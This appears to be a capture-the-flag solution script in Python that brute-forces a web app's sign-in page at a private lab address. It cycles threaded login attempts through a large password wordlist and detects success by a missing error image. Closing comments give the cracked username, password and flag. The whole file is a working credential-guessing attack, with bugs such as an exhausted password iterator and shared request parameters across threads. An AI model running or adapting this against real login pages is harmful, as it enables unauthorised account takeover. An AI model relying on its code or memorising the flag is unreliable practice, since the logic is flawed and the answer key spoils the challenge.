from queue import Queue
from lxml import etree

import requests
import threading

url = "http://192.168.122.118:80"
params = {"page": "signin","Login": "Login"}

passwords_file = open("1000000-password-seclists.txt", "r")
usernames = open("usernames.txt", "r")
queue = Queue(maxsize=10000)
found = False

def is_wrong(html):
    tree = etree.HTML(html)
    image = tree.xpath('//div[@class="container"]/center/img/@src')[0]
    return image == "images/WrongAnswer.gif"


def try_login():
    global found
    username, password = queue.get()
    params["password"] = password.strip()
    params["username"] = username.strip()
    print(f"Trying username: {username.strip()} and password: {password.strip()}")
    r = requests.get(url, params=params)
    if r.status_code == 200 and not is_wrong(r.text):
        print(f"Found password for {username}: {password}")
        found = True
        return True
    return False

def bruteforce():
    for username in usernames:
        for password in passwords_file:
            if found:
                queue.shutdown()
                break
            queue.put((username, password))
            threading.Thread(target=try_login).start()

if __name__ == "__main__":
    bruteforce()

# After less then 1 minute of bruteforcing, the password for user "Aaren" is found: "shadow".
# Flag: b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2